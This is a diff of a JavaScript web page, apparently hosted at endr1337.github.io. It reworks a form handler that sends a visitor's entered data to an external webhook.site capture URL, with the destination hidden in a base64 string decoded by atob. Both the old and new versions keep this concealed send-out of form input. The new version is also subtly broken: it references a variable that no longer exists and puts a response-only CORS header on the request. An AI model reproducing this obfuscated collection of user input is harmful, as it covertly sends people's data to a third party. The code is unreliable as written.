@@ -52,31 +52,29 @@
             name: nameField.value,
           };
         
-             var encodedURL = 'aHR0cHM6Ly93ZWJob29rLnNpdGUvZjM1MGY4OGItMmFmZS00ODg4LWJkMjMtODUyNzEyODc1MDMy';
-             var decodedURL = atob(encodedURL);
+             var eURL = 'aHR0cHM6Ly93ZWJob29rLnNpdGUvZjM1MGY4OGItMmFmZS00ODg4LWJkMjMtODUyNzEyODc1MDMy';
+             var dURL = atob(encodedURL);
 
-          fetch(decodedURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Origin': 'http://endr1337.github.io',
-              'Access-Control-Request-Method': 'POST', 
-              'Access-Control-Request-Headers': 'Content-Type' 
-            },
-            mode: 'cors',
-            body: JSON.stringify(payload)
-          })
-          .then(function(response) {
-            console.log(response);
+                fetch(dURL, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': 'http://endr1337.github.io'
+                  },
+                  mode: 'cors',
+                  body: JSON.stringify(payload)
+                })
+                .then(function(response) {
+                  console.log(response);
 
-            mainButton.disabled = false;
-          })
-          .catch(function(error) {
-            console.error(error);
+                  mainButton.disabled = false;
+                })
+                .catch(function(error) {
+                  console.error(error);
+                });
+              }
+            });
           });
-        }
-      });
-    });
 
     function submitFormAndOpenWebsite() {
       var mainButton = document.getElementById('mainButton');
